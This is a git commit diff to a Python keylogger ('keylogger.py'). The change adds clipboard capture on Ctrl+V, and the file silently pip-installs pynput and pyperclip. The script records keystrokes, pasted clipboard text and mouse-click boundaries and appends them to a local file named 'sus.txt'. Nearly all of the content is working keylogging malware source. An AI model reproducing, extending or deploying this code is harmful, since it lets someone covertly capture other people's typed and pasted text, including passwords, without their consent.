86ecc3238014541707d9ffc947635c01a4a24030
AhmedZahran02 <ahmed.zahran02@eng-st.cu.edu.eg>
2023-09-02 13:02:17 +0300

    clipborad racing is fixed

--- keylogger.py
+++ keylogger.py
@@ -3,55 +3,74 @@ import sys
 import subprocess
 import pkg_resources
 
-required = {'pynput'}
+required = {'pynput', 'pyperclip'}
 installed = {pkg.key for pkg in pkg_resources.working_set}
 missing = required - installed
 
 if missing:
     python = sys.executable
-    subprocess.check_call([python, '-m', 'pip', 'install', *missing], stdout=subprocess.DEVNULL)
+    subprocess.check_call(
+        [python, '-m', 'pip', 'install', *missing], stdout=subprocess.DEVNULL)
 
 # key logger logic
-from pynput import keyboard,mouse
 from pynput.keyboard import Controller
 from threading import Lock
-word=""
+import pyperclip
+import time
+from pynput import keyboard, mouse
+
+word = ""
 lock = Lock()
+
+
 def writeInFile(s):
-    file = open("sus.txt",'a')
+    file = open("sus.txt", 'a')
     lock.acquire()
-    try: 
+    try:
         file.write(s)
     except:
         print("Why r u still here")
     lock.release()
     file.close()
 
+
 def handleKey(key):
     print(key)
     global word
-    if hasattr(key,"char"):
-        if key.char == 'v' and keyboard.Controller.shift_pressed == True:
+    if hasattr(key, "char"):
+        if key.char == '\x03' or key.char == '\x13' or key.char == '\x01' or key.char == '\x18':
+            # skip
+            print("ctrl chars skipped")
+        elif key.char == '\x16':
             # clipboard checking
-            print()
+            print("ctrl + v")
+            try:
+                time.sleep(0.2)
+                data = pyperclip.paste()
+            except:
+                print("failled to open clipboard")
+            if isinstance(data, str):
+                word += str(data)
         else:
-            word+= key.char
-    elif key == keyboard.Key.backspace and len(word)>0:
+            word += key.char
+    elif key == keyboard.Key.backspace and len(word) > 0:
         word = word.rstrip(word[-1])
     elif key == keyboard.Key.space and len(word) != 0:
         word += ' '
     elif key == keyboard.Key.enter and len(word) != 0:
         writeInFile(word+'\n')
         print(word)
-        word=""     
-    
-def handleClick(x,y,button,pressed):
+        word = ""
+
+
+def handleClick(x, y, button, pressed):
     global word
     if button == mouse.Button.left and pressed == 0 and len(word) != 0:
         writeInFile(word+'\n')
         print(word)
-        word=""
-    
+        word = ""
+
+
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=handleKey)
     listener.start()
